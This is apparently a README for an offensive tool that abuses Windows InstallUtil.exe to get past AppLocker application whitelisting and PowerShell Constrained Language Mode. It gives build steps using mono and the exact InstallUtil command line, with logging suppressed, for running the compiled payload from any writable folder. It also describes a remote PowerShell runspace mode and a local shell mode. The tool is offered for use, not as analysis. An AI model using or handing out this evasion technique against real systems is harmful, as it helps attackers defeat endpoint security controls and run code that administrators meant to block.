# Install Util Bypass App Locker
Abuse install utility, powershell run space to bypass app locker and CLM, build in linux by mono mcs.


## Requirement
```
sudo apt install -y mono-complete
```

## Build
```
chmod +x ./build.sh
./build.sh
```

## Method 1
Use to remote execute powershell runspace

## Method 2
Just spawn a powershell in the same session (NO AMSI Bypass)

Edit from https://github.com/calebstewart/bypass-clm/

## Use
Put the compiled file "install_util.exe" into any writeable folder, and execute following command
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Program.exe
```
